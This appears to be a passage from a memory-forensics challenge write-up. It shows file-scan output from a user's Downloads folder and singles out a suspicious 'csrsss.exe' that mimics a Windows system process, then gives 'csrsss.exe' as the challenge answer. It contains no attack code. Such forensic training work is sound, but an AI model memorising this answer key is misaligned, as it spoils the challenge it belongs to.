0x000000011e955820     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011ee95460     12      0 R--rw- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.zip
0x000000011fa45c20     16      0 -W-r-- \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fc1db70      2      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1.exe
0x000000011fd79a90     16      0 RW-rwd \Device\HarddiskVolume2\Users\user\Downloads\7z2201-x64.exe
0x000000011fdbd560     16      0 R--rwd \Device\HarddiskVolume2\Users\Public\Downloads\desktop.ini
0x000000011fdeb470     10      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
0x000000011fe5b070     15      0 R--r-- \Device\HarddiskVolume2\Users\user\Downloads\bf9e9366489541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.zip
```

从中可以定位到这条记录

```plaintext
0x000000011fdeb470     10      0 R--r-d \Device\HarddiskVolume2\Users\user\Downloads\csrsss.exe9541153d0e2cd21bdae11591f6be48407f896b75e1320628346b03.exe
```

```plaintext title="Answer"
csrsss.exe
```
